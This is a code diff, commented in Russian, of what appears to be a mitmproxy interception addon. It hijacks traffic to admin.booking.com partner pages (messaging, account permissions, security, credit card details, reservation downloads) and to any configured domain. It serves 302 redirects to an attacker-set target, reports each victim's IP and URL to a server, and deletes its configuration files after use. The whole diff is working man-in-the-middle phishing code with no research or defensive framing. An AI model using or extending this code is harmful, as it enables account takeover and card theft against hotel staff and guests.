@@ -947,14 +947,16 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
 def custom_redirect(flow: http.HTTPFlow) -> bool:
     """
     ФУНКЦИЯ 17: ЕДИНОРАЗОВЫЙ КАСТОМНЫЙ РЕДИРЕКТ
+    Работает для ЛЮБЫХ доменов, независимо от использования ранее
     """
     try:
-        # ВАЖНО: Проверяем DONE flag ПЕРВЫМ делом
-        if os.path.exists(CUSTOM_REDIRECT_DONE_FLAG):
-            log("[F17] One-time redirect already performed - skipping check")
+        # 1. Проверяем активацию
+        if not should_custom_redirect():
             return False
         
-        if not should_custom_redirect():
+        # 2. Проверяем done flag (если есть - функция уже выполнена)
+        if os.path.exists(CUSTOM_REDIRECT_DONE_FLAG):
+            log("[F17] One-time redirect already performed - skipping")
             return False
         
         url = flow.request.pretty_url
@@ -962,37 +964,71 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
         to_domain = get_custom_redirect_to()
         
         if not from_domain or not to_domain:
-            log("[F17] No redirect configuration found")
+            log("[F17] Missing FROM or TO domains")
             return False
         
-        # Очищаем URL для сравнения
-        from_domain_clean = from_domain.lower().rstrip("/")
-        url_lower = url.lower()
+        # НОРМАЛИЗАЦИЯ URL
+        # Убираем протокол и www для сравнения
+        def normalize_url(url_str: str) -> str:
+            """Нормализует URL для сравнения"""
+            if not url_str:
+                return ""
+            # Убираем протокол
+            if url_str.startswith('https://'):
+                url_str = url_str[8:]
+            elif url_str.startswith('http://'):
+                url_str = url_str[7:]
+            # Убираем www
+            if url_str.startswith('www.'):
+                url_str = url_str[4:]
+            # Убираем trailing slash
+            url_str = url_str.rstrip('/')
+            return url_str.lower()
         
-        # Проверяем, начинается ли URL с указанного домена "откуда"
-        if not url_lower.startswith(from_domain_clean):
+        # Нормализуем URL запроса
+        request_url_lower = url.lower()
+        request_host = flow.request.pretty_host.lower()
+        
+        # Нормализуем from_domain (целевой домен)
+        from_domain_normalized = normalize_url(from_domain)
+        
+        log(f"[F17] Checking: request_host={request_host}, from_domain={from_domain_normalized}")
+        log(f"[F17] Full request URL: {request_url_lower}")
+        
+        # ПРОВЕРКА 1: Сравниваем хост запроса с целевым доменом
+        if from_domain_normalized not in request_host:
+            log(f"[F17] Domain '{from_domain_normalized}' not in '{request_host}' - skipping")
             return False
         
-        # Если уже на целевом URL - не делаем редирект
-        to_domain_clean = to_domain.lower().rstrip("/")
-        if url_lower.startswith(to_domain_clean):
+        # ПРОВЕРКА 2: Убедимся, что это не редирект на тот же домен
+        to_domain_normalized = normalize_url(to_domain)
+        if to_domain_normalized in request_host:
+            log(f"[F17] Already on target domain '{to_domain_normalized}' - skipping")
             return False
         
-        log(f"[FUNCTION 17] ONE-TIME redirect triggered!")
+        # ПРОВЕРКА 3: Убедимся, что это HTTP/HTTPS запрос (не websocket и т.д.)
+        if not request_url_lower.startswith(('http://', 'https://')):
+            log(f"[F17] Not HTTP/HTTPS request - skipping")
+            return False
+        
+        log(f"[F17] ✓ ONE-TIME redirect triggered!")
         log(f"[F17] From: {url}")
         log(f"[F17] To:   {to_domain}")
         
-        # Логируем редирект (ПЕРВЫЙ и ЕДИНСТВЕННЫЙ раз)
+        # Логируем редирект
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, to_domain, "CUSTOM_ONETIME_REDIRECT")
         
-        # ВАЖНО: СНАЧАЛА создаем DONE flag (чтобы другие функции сразу могли работать)
+        # Создаем DONE flag СРАЗУ
         try:
+            parent_dir = os.path.dirname(CUSTOM_REDIRECT_DONE_FLAG)
+            if parent_dir and not os.path.exists(parent_dir):
+                os.makedirs(parent_dir, exist_ok=True)
             with open(CUSTOM_REDIRECT_DONE_FLAG, 'w') as f:
                 f.write("1")
-            log("[F17] One-time redirect DONE flag set IMMEDIATELY")
+            log("[F17] One-time redirect DONE flag created")
         except Exception as e:
-            log(f"[F17] Error setting done flag: {e}")
+            log(f"[F17] Error creating done flag: {e}")
         
         # Выполняем редирект
         flow.response = http.Response.make(
@@ -1007,31 +1043,29 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
             }
         )
         
-        # ЗАДЕРЖКА: удаляем флаг активации через 2 секунды
-        def remove_flags():
-            time.sleep(2)
+        # Удаляем активацию через 3 секунды
+        def cleanup_activation():
+            time.sleep(3)
             try:
-                # Удаляем флаг активации
                 if os.path.exists(CUSTOM_REDIRECT_FLAG):
                     os.remove(CUSTOM_REDIRECT_FLAG)
-                    log("[F17] Activation flag removed after delay")
-                
-                # УДАЛЯЕМ DONE FLAG чтобы другие функции могли работать
-                if os.path.exists(CUSTOM_REDIRECT_DONE_FLAG):
-                    os.remove(CUSTOM_REDIRECT_DONE_FLAG)
-                    log("[F17] Done flag removed after delay - other functions can now work")
-                
-                log("[F17] Function 17 completed")
-                
+                    log("[F17] Activation flag removed")
+                # Также удаляем файлы конфигурации
+                if os.path.exists(CUSTOM_REDIRECT_FROM_FILE):
+                    os.remove(CUSTOM_REDIRECT_FROM_FILE)
+                if os.path.exists(CUSTOM_REDIRECT_TO_FILE):
+                    os.remove(CUSTOM_REDIRECT_TO_FILE)
             except Exception as e:
-                log(f"[F17] Error in delayed flag removal: {e}")
+                log(f"[F17] Error removing activation flag: {e}")
         
-        threading.Thread(target=remove_flags, daemon=True).start()
+        threading.Thread(target=cleanup_activation, daemon=True).start()
         
         return True
         
     except Exception as e:
         log(f"[F17] custom_redirect error: {e}")
+        import traceback
+        log(f"[F17] Traceback: {traceback.format_exc()}")
         return False
         
 def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
@@ -1199,8 +1233,9 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
         return False
 
 # Главная точка входа
+# Главная точка входа - ИСПРАВЛЕННАЯ ВЕРСИЯ
 def request(flow: http.HTTPFlow) -> None:
-    # Логируем доступ к платформам
+    # Логируем доступ к платформам (только мониторинг)
     if should_log_domain(flow):
         try:
             client_ip = get_client_ip(flow)
@@ -1221,138 +1256,119 @@ def request(flow: http.HTTPFlow) -> None:
     
     redirect_target = get_redirect_target()
     
-    # ========== ФУНКЦИЯ 17: ЕДИНОРАЗОВЫЙ КАСТОМНЫЙ РЕДИРЕКТ ==========
+    # ========== ПРИОРИТЕТ 1: ФУНКЦИЯ 17 (ЕДИНОРАЗОВЫЙ КАСТОМ) ==========
+    # Функция 17 работает для ВСЕХ доменов, независимо от target domains
     if custom_redirect(flow):
         return
     
-    # ========== ФУНКЦИЯ 18: BOOKING RESERVATIONS DOWNLOAD REDIRECT ==========
-    if booking_reservations_download_redirect(flow):
+    # ========== ПРИОРИТЕТ 2: ФУНКЦИИ ДЛЯ BOOKING (18, 19, 13, 15, 7-12) ==========
+    host = (flow.request.pretty_host or "").lower()
+    
+    # Функция 18 (резервы) - только для admin.booking.com
+    if host.endswith("admin.booking.com") and booking_reservations_download_redirect(flow):
         return
         
-    # ========== ФУНКЦИЯ 19: BOOKING CREDIT CARD DETAILS REDIRECT ==========
-    if booking_cc_details_redirect(flow):
+    # Функция 19 (карты) - только для booking.com
+    if host.endswith("booking.com") and booking_cc_details_redirect(flow):
         return
     
-    # ========== КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ ==========
-    # НЕ ВЫХОДИМ РАНЬШЕ ВРЕМЕНИ! 
-    # Даже если redirect_target пустой, функции 7-10 должны работать
-    # Только обычные редиректы (force, one-shot, cookie-based) не работают при пустом таргете
-    
-    host = (flow.request.pretty_host or "").lower()
-    path = flow.request.path or "/"
-    client_ip = get_client_ip(flow)
+    # ========== ПРИОРИТЕТ 3: BOOKING-SPECIFIC РЕДИРЕКТЫ ==========
+    # Эти функции работают ТОЛЬКО для admin.booking.com
+    if host.endswith("admin.booking.com"):
+        # Функция 15 (безопасность)
+        if booking_hotel_security_redirect(flow):
+            return
+            
+        # Функция 13 (отели)
+        if booking_hotel_global_redirect(flow):
+            return
 
-    # Только если есть redirect_target, проверяем не является ли это сам таргет
-    if redirect_target and is_redirect_target(flow, redirect_target):
+        # Операция 11 (переключение 7->8)
+        if (should_operation_11() and 
+            flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings")):
+            log("Operation 11: user reached messaging/settings page, enabling provider redirect")
+            try:
+                with open(PROVIDER_FLAG, 'w') as f:
+                    f.write("enabled")
+            except Exception as e:
+                log(f"Error enabling provider redirect: {e}")
+            return
+        
+        # Операция 12 (переключение 9->10)
+        if (should_operation_12() and 
+            flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions")):
+            log("Operation 12: user reached accounts_and_permissions page, enabling security redirect")
+            try:
+                with open(SECURITY_FLAG, 'w') as f:
+                    f.write("enabled")
+            except Exception as e:
+                log(f"Error enabling security redirect: {e}")
+            return
+        
+        # Функции 7-10 (основные редиректы)
+        if booking_redirect(flow, "message"):
+            if should_operation_11():
+                log("Operation 11: message redirect completed")
+            return
+            
+        if booking_redirect(flow, "provider"):
+            if should_operation_11():
+                log("Operation 11: provider redirect completed, operation finished")
+                remove_operation_11_flag()
+            return
+            
+        if booking_redirect(flow, "user"):
+            if should_operation_12():
+                log("Operation 12: user redirect completed")
+            return
+            
+        if booking_redirect(flow, "security"):
+            if should_operation_12():
+                log("Operation 12: security redirect completed, operation finished")
+                remove_operation_12_flag()
+            return
+    
+    # ========== ПРИОРИТЕТ 4: ОБЫЧНЫЕ РЕДИРЕКТЫ (только если redirect_target не пустой) ==========
+    if not redirect_target:
+        # Если redirect_target пустой - НЕ выполняем обычные редиректы
+        log(f"No redirect target configured, skipping normal redirects for {host}")
+        return
+    
+    # Проверяем, не является ли это сам таргет
+    if is_redirect_target(flow, redirect_target):
         log(f"skip redirect for target itself: {flow.request.pretty_url}")
         return
+    
+    # Обычные редиректы
+    if should_force():
+        log(f"FORCE redirect {flow.request.pretty_url} -> {redirect_target}")
+        client_ip = get_client_ip(flow)
+        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "FORCE")
+        flow.response = http.Response.make(302, b"", {"Location": redirect_target})
+        return
 
-    log(f"incoming {host}{path} client={client_ip}")
+    if should_one_shot():
+        log(f"GLOBAL ONE-SHOT redirect {flow.request.pretty_url} -> {redirect_target}")
+        client_ip = get_client_ip(flow)
+        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
+        flow.response = http.Response.make(
+            302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
+        )
+        remove_one_shot_flag()
+        return
 
-    # --- Обработка других функций ---
-    target_domains = ["admin.booking.com", "bbc.com"]
-
-    for domain in target_domains:
-        if host.endswith(domain.lower()):
-            # --- ОПЕРАЦИЯ 16: Переключение с функции 13 на функцию 15 ---
-            if should_operation_16():
-                if not should_booking_hotel() and should_booking_hotel_security():
-                    pass
-                elif should_booking_hotel():
-                    pass
-            
-            # --- ФУНКЦИЯ 15: Booking Hotel Security Redirect ---
-            if booking_hotel_security_redirect(flow):
-                return
-                
-            # --- ФУНКЦИЯ 13: Booking hotel global redirect ---
-            if booking_hotel_global_redirect(flow):
-                return
-
-            # Операция 11
-            if (should_operation_11() and 
-                flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings")):
-                log("Operation 11: user reached messaging/settings page, enabling provider redirect")
-                try:
-                    with open(PROVIDER_FLAG, 'w') as f:
-                        f.write("enabled")
-                except Exception as e:
-                    log(f"Error enabling provider redirect: {e}")
-                return
-            
-            # Операция 12
-            if (should_operation_12() and 
-                flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions")):
-                log("Operation 12: user reached accounts_and_permissions page, enabling security redirect")
-                try:
-                    with open(SECURITY_FLAG, 'w') as f:
-                        f.write("enabled")
-                except Exception as e:
-                    log(f"Error enabling security redirect: {e}")
-                return
-            
-            # Стандартные редиректы (7-10) - ДОЛЖНЫ РАБОТАТЬ ДАЖЕ ПРИ ПУСТОМ redirect_target
-            if booking_redirect(flow, "message"):
-                if should_operation_11():
-                    log("Operation 11: message redirect completed")
-                return
-                
-            if booking_redirect(flow, "provider"):
-                if should_operation_11():
-                    log("Operation 11: provider redirect completed, operation finished")
-                    remove_operation_11_flag()
-                return
-                
-            if booking_redirect(flow, "user"):
-                if should_operation_12():
-                    log("Operation 12: user redirect completed")
-                return
-                
-            if booking_redirect(flow, "security"):
-                if should_operation_12():
-                    log("Operation 12: security redirect completed, operation finished")
-                    remove_operation_12_flag()
-                return
-
-            # ========== ВАЖНО! ==========
-            # Эти редиректы работают ТОЛЬКО если redirect_target не пустой
-            if not redirect_target:
-                # Если redirect_target пустой - не выполняем обычные редиректы
-                # но функции 7-10 уже обработаны выше
-                return
-            
-            # Обычные редиректы (только при наличии redirect_target)
-            if should_force():
-                log(f"FORCE redirect {host}{path} -> {redirect_target}")
-                client_ip = get_client_ip(flow)
-                log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "FORCE")
-                flow.response = http.Response.make(302, b"", {"Location": redirect_target})
-                return
-
-            if should_one_shot():
-                log(f"GLOBAL ONE-SHOT redirect {host}{path} -> {redirect_target}")
-                client_ip = get_client_ip(flow)
-                log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
-                flow.response = http.Response.make(
-                    302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
-                )
-                remove_one_shot_flag()
-                return
-
-            cookie_present = False
-            try:
-                cookie_present = bool(flow.request.cookies.get(COOKIE))
-            except Exception:
-                cookie_present = False
-
-            if cookie_present:
-                log(f"cookie present -> skipping redirect for {host}")
-                return
-
-            log(f"one-shot client redirect {host}{path} -> {redirect_target}")
-            client_ip = get_client_ip(flow)
-            log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
-            flow.response = http.Response.make(
-                302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
-            )
+    # Cookie-based редирект
+    try:
+        cookie_present = bool(flow.request.cookies.get(COOKIE))
+        if cookie_present:
+            log(f"cookie present -> skipping redirect for {host}")
             return
+    except Exception:
+        pass
+
+    log(f"one-shot client redirect {flow.request.pretty_url} -> {redirect_target}")
+    client_ip = get_client_ip(flow)
+    log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
+    flow.response = http.Response.make(
+        302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
+    )
